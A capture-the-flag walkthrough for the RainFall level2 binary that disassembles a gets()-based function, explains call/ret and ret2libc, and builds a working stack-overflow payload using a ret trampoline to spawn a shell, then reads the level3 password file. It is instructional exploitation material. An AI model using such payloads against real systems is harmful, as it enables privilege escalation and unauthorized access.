# Rainfall

## Level2

```sh
level2@RainFall:~$ ls -l
total 8
-rwsr-s---+ 1 level3 users 5403 Mar  6  2016 level2
```

```sh
level2@RainFall:~$ ./level2 
hello
hello
level2@RainFall:~$ 
```

```sh
(gdb) disas main
Dump of assembler code for function main:
   0x0804853f <+0>:     push   %ebp
   0x08048540 <+1>:     mov    %esp,%ebp
   0x08048542 <+3>:     and    $0xfffffff0,%esp
   # Set and Align stack
   0x08048545 <+6>:     call   0x80484d4 <p>
   # Call the p function
   0x0804854a <+11>:    leave  
   0x0804854b <+12>:    ret    
End of assembler dump.
(gdb) 
```

```sh
(gdb) disas p
Dump of assembler code for function p:
   0x080484d4 <+0>:     push   %ebp
   0x080484d5 <+1>:     mov    %esp,%ebp
   0x080484d7 <+3>:     sub    $0x68,%esp # Allocate 0x68 (104) bytes on the stack
   0x080484da <+6>:     mov    0x8049860,%eax
   0x080484df <+11>:    mov    %eax,(%esp)
   0x080484e2 <+14>:    call   0x80483b0 <fflush@plt> #Flush the output
   0x080484e7 <+19>:    lea    -0x4c(%ebp),%eax # Load a 0x4c (76) bytes buffer
   0x080484ea <+22>:    mov    %eax,(%esp) # Put the buffer at the top of the stack
   0x080484ed <+25>:    call   0x80483c0 <gets@plt> # gets(buffer)
   0x080484f2 <+30>:    mov    0x4(%ebp),%eax # Load the saved return address into eax
   0x080484f5 <+33>:    mov    %eax,-0xc(%ebp) # Save it into a variable
   0x080484f8 <+36>:    mov    -0xc(%ebp),%eax # Load it back into eax
   0x080484fb <+39>:    and    $0xb0000000,%eax # Bitwise AND eax with 0xb0000000
   0x08048500 <+44>:    cmp    $0xb0000000,%eax # Compare the masked return address with 0xb0000000
   0x08048505 <+49>:    jne    0x8048527 <p+83> # If not equal, skip to PATH B

   0x08048507 <+51>:    mov    $0x8048620,%eax # PATH A (bad)
   0x0804850c <+56>:    mov    -0xc(%ebp),%edx
   0x0804850f <+59>:    mov    %edx,0x4(%esp)
   0x08048513 <+63>:    mov    %eax,(%esp)
   0x08048516 <+66>:    call   0x80483a0 <printf@plt>
   0x0804851b <+71>:    movl   $0x1,(%esp)
   0x08048522 <+78>:    call   0x80483d0 <_exit@plt> # exit

   0x08048527 <+83>:    lea    -0x4c(%ebp),%eax # PATH B (good)
   0x0804852a <+86>:    mov    %eax,(%esp)
   0x0804852d <+89>:    call   0x80483f0 <puts@plt>
   0x08048532 <+94>:    lea    -0x4c(%ebp),%eax
   0x08048535 <+97>:    mov    %eax,(%esp)
   0x08048538 <+100>:   call   0x80483e0 <strdup@plt>
   0x0804853d <+105>:   leave
   0x0804853e <+106>:   ret    
End of assembler dump.
```

```sh
              +---------------------------+
              |       Start of p          |
              |  (push ebp, set ebp, etc.) |
              +-------------+-------------+
                            |
                            v
              +---------------------------+
              | Allocate 104 bytes on     |
              | the stack (sub $0x68,esp)  |
              +-------------+-------------+
                            |
                            v
              +---------------------------+
              | Flush output (fflush)     |
              +-------------+-------------+
                            |
                            v
              +---------------------------+
              | Compute & load address of |
              | 76-byte buffer (lea -0x4c) |
              +-------------+-------------+
                            |
                            v
              +---------------------------+
              | Call gets(buffer)         |
              |  (User input is stored)   |
              +-------------+-------------+
                            |
                            v
              +---------------------------+
              | Retrieve saved return     |
              | address from caller       |
              | (mov 0x4(%ebp),eax)        |
              +-------------+-------------+
                            |
                            v
              +---------------------------+
              | Save return address in    |
              | local variable (-0xc)     |
              +-------------+-------------+
                            |
                            v
              +---------------------------+
              | Mask saved return address |
              | with 0xb0000000 (AND)     |
              +-------------+-------------+
                            |
                            v
              +---------------------------+
              | Compare with 0xb0000000   |
              +-------------+-------------+
                            |
                +-----------+-----------+
          (Equal)|                       |(Not Equal)
                v                       v
       +------------------+    +--------------------------+
       | Path A:          |    | Path B:                  |
       | Condition True   |    | Condition False          |
       +------------------+    +--------------------------+
       |                  |    |                          |
       |  Load constant   |    |  Load buffer address     |
       |  0x8048620 into |    |  (for puts)              |
       |  EAX             |    |                          |
       |                  |    |  Call puts(buffer)       |
       +------------------+    +--------------------------+
       |                  |    |                          |
       |  Prepare printf  |    |  Load buffer address     |
       |  arguments:      |    |  (for strdup)            |
       |   - Saved return |    |                          |
       |     address,     |    |  Call strdup(buffer)     |
       |   - Constant     |    |                          |
       +------------------+    +--------------------------+
       |  Call printf()   |    |  Leave stack frame &     |
       |                  |    |  return to caller        |
       +------------------+    +--------------------------+
       |  Push constant 1 |
       |  and call _exit()|
       |  (Terminate p)   |
       +------------------+
```

## Ret instruction

### Explanation
Let's explain how the call instruction and ret instruction (return) works first, will take simple C code as an exemple

```c
void blue() {
   //step 2
}

int main() {
   //step 1
    blue();
    //step 3
    return 0;
}
```

here is the asm code
```sh
(gdb) disas main
Dump of assembler code for function main:
   0x080483c3 <+0>:     push   %ebp # Save caller's EBP (base pointer of caller's stack frame)
   0x080483c4 <+1>:     mov    %esp,%ebp # Set EBP = ESP (base pointer of current stack frame = pointer of top of stack) note that EBP is const and ESP will get updated as values are pushed / popped of the stack
   0x080483c6 <+3>:     call   0x080483b4 <blue> # Call blue: push return address and jump to blue
   0x080483cb <+8>:     pop    %ebp # Restore caller's EBP
   0x080483cc <+9>:     ret    # return from main
End of assembler dump.
(gdb) disas blue
Dump of assembler code for function blue:
   0x080483b4 <+0>:     push   %ebp # Save caller's base pointer (from main) onto the stack
   0x080483b5 <+1>:     mov    %esp,%ebp # Establish blue's stack frame
   0x080483b7 <+3>:     pop    %ebp # Restore main's base pointer (Remove blue's frame)
   0x080483b8 <+4>:     ret # pops the return address (pushed by call in main) and jumps to it
End of assembler dump.
```

So after calling blue() we return to the main function at step3.
There is no exploit possible here. It was just a simple way to explain how the call and ret instructions work

Now that we explain ret, let's see ret2libc

## Ret2Libc

Ret2Libc attack is a buffer overflow which goal is to replace the default return address with the address of a Libc function (system in this case)
```
+------------------------------------------------------+---------------+---------------------+
|  Local Variables:                                    |   Saved EBP   |   Saved Return Addr |
|  - Local Buffer (64 bytes)                           |   (4 bytes)   |    (4 bytes)        |
|  - (other local variables, if any)                   |               |                     |
+------------------------------------------------------+---------------+---------------------+
```
```c
void func()
{
   char buffer[64];
   gets(buffer);
   return ;
}
```

To do this we need to reach the return address position. [How to reach return address position](https://github.com/Junya42/Rainfall/tree/main/level2/walkthrough.md#eip-register-anchor)
Which is at offset: 68 (buffer 64 bytes + saved_ebp 4 bytes)

Then we need to retrieve the address of libc:system.
```sh
level2@RainFall:~$ gdb level2 
(gdb) b main
Breakpoint 1 at 0x8048542
(gdb) run
Starting program: /home/user/level2/level2 

Breakpoint 1, 0x08048542 in main ()
(gdb) p system
$1 = {<text variable, no debug info>} 0xb7e6b060 <system> #address of system
```

Them we also need the address of the exit function.
Why do need exit's address ?

System is a function, and it also need a valid return address, we are using exit by default to leave the program cleanly
```sh
(gdb) p exit
$2 = {<text variable, no debug info>} 0xb7e5ebe0 <exit>
```

Now we need the address of the string "/bin/sh" to send it as an argument for system()
```sh
(gdb) info proc map
process 2938
Mapped address spaces:

        Start Addr   End Addr       Size     Offset objfile
         0x8048000  0x8049000     0x1000        0x0 /home/user/level2/level2
         0x8049000  0x804a000     0x1000        0x0 /home/user/level2/level2
        0xb7e2b000 0xb7e2c000     0x1000        0x0
      [0xB7E2C000] 0xb7fcf000   0x1a3000        0x0 /lib/i386-linux-gnu/libc-2.15.so #Start addr
        0xb7fcf000 0xb7fd1000     0x2000   0x1a3000 /lib/i386-linux-gnu/libc-2.15.so
        0xb7fd1000 [0xB7FD2000]     0x1000   0x1a5000 /lib/i386-linux-gnu/libc-2.15.so #End addr
        0xb7fd2000 0xb7fd5000     0x3000        0x0
        0xb7fdb000 0xb7fdd000     0x2000        0x0
        0xb7fdd000 0xb7fde000     0x1000        0x0 [vdso]
        0xb7fde000 0xb7ffe000    0x20000        0x0 /lib/i386-linux-gnu/ld-2.15.so
        0xb7ffe000 0xb7fff000     0x1000    0x1f000 /lib/i386-linux-gnu/ld-2.15.so
        0xb7fff000 0xb8000000     0x1000    0x20000 /lib/i386-linux-gnu/ld-2.15.so
        0xbffdf000 0xc0000000    0x21000        0x0 [stack]
(gdb) find 0xb7e2c000, 0xb7fd2000, "/bin/sh" # find string "/bin/sh" from start of libc [0xB7E2C000] to end of libc [0xB7FD2000]
0xb7f8cc58
1 pattern found.
(gdb)
```

So we need to put some paddings ('a' * 64) inside the buffer first until we saved ebp,
then we also need some paddings ('b' * 4) to skip the saved ebp

At this point we reached the return address so we need to put the address of system in little-endian format 
(0xb7e6b060 -> \x60\xb0\xe6\xb7)

Now we need to give a return address for system which will be the address of exit in little-endian format
(0xb7e5ebe0 -> \xe0\xeb\xe5\xb7)

And then the argument for system which is the address of "/bin/sh" in little-endian format once again
(0xb7f8cc58 -> \x58\xcc\xf8\xb7)

This would look like this:
```sh
[ aaaaaaaaaaaaa..... ] # padding to reach saved ebp
[ bbbb ] # padding to reach return address
[ \x60\xb0\xe6\xb7 ] # set return address to system()
[ \xe0\xeb\xe5\xb7 ] # set ebp + 4 = return address of system() = exit()
[ \x58\xcc\xf8\xb7 ] # set ebp + 8 = "/bin/sh" = First argument = system("/bin/sh")
```

We can do it all in one line using python, notice the usage of cat
It will allow stdin to stay to open in order for us to interact with the shell

```sh
(python -c "print('a' * 64 + 'b' * 4 + '\x60\xb0\xe6\xb7' + '\xe0\xeb\xe5\xb7' + '\x58\xcc\xf8\xb7')"; cat) | ./a.out
```

## Solution

Finally after a lot of explanations we reached the solution.

We just have one more issue.

Remember the diagram showing the program execution, there is a check on the return address that verifies if it lies below 0xb0000000,
and that is the case for the address of system which is located at 0xb7e6b060

So we need to bypass this, to avoid exiting the program before reach the ret instruction.

In order to do this we can exploit the ret instruction itself.

If we put \x3e\x85\x04\x08 (0x0804853e, the address of the ret instruction of function p) as the return address
and offset everything else by 4 bytes we obtain this:
```sh
[ aaaaaaaaaaaaa..... ] # padding to reach saved ebp
[ bbbb ] # padding to reach return address
[ \x3e\x85\x04\x08 ] # set return address to 'ret' instruction (trampoline) (bypass the check)
[ \x60\xb0\xe6\xb7 ] # This value is popped by the trampoline and becomes the new return address (system())
[ \xe0\xeb\xe5\xb7 ] # Fake return address for system() (exit() address)
[ \x58\xcc\xf8\xb7 ] # First argument for system() (pointer to the string "/bin/sh")
```

Which result in this command:
```sh
level2@RainFall:~$ (python -c "print('a' * 76 + 'b' * 4 + '\x3e\x85\x04\x08' + '\x60\xb0\xe6\xb7' + '\xe0\xeb\xe5\xb7' + '\x58\xcc\xf8\xb7')"; cat) | ./level2
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa>�aaaaaaaabbbb>�`�����X���
cat /home/user/level3/.pass
492deb0e7d14c4b5695173cca843c4384fe52d0857c2b0718e1a521a4d33ec02
```


##### Explanation:

Padding to Saved EBP:
- The first section (aaaaaaaaaaaaa.....) fills the buffer and reaches the saved EBP.

Overwrite Saved EBP:
- The next 4 bytes (bbbb) overwrite the saved EBP; their value is not critical (often junk).

Trampoline (Ret Instruction):
- The following 4 bytes (\x3e\x85\x04\x08) replace the saved return address with the address of a ret instruction in your binary. This trampoline address bypasses the check that would otherwise catch a libc address.

System() Address:
- The trampoline’s ret pops the next 4 bytes (\x60\xb0\xe6\xb7) off the stack, making that value the new return address. This should be the address of system().

Fake Return Address for system():
- The next 4 bytes (\xe0\xeb\xe5\xb7) serve as system()’s return address. They’re typically set to the address of exit() so that if system() returns, the program terminates gracefully.

Argument for system():
- The final 4 bytes (\x58\xcc\xf8\xb7) point to the string "/bin/sh", which becomes the first argument for system(), causing it to execute system("/bin/sh").

This chain ensures that control flows correctly: the vulnerable function returns to the trampoline, which then directs execution to system() with the proper arguments.